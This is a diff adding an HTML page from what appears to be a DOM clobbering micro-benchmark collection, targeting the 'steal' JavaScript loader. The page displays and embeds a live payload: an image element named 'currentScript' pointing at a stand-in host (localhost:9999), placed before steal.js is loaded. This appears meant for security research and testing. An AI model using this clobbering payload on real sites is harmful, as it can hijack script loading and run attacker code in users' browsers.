@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+</head>
+<body>
+<h1>DOM Clobbering Collection - steal</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;image name=&quot;currentScript&quot; src=&quot;http://localhost:9999&quot;&gt;&lt;/image&gt;</pre>
+  <image name="currentScript" src="http://localhost:9999"></image>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;script src=&quot;./node_modules/steal/steal.js&quot; main&gt;&lt;/script&gt;</pre>
+  <script src="./node_modules/steal/steal.js" main></script>
+  </div>
+</section>
+
+</body>
+</html>
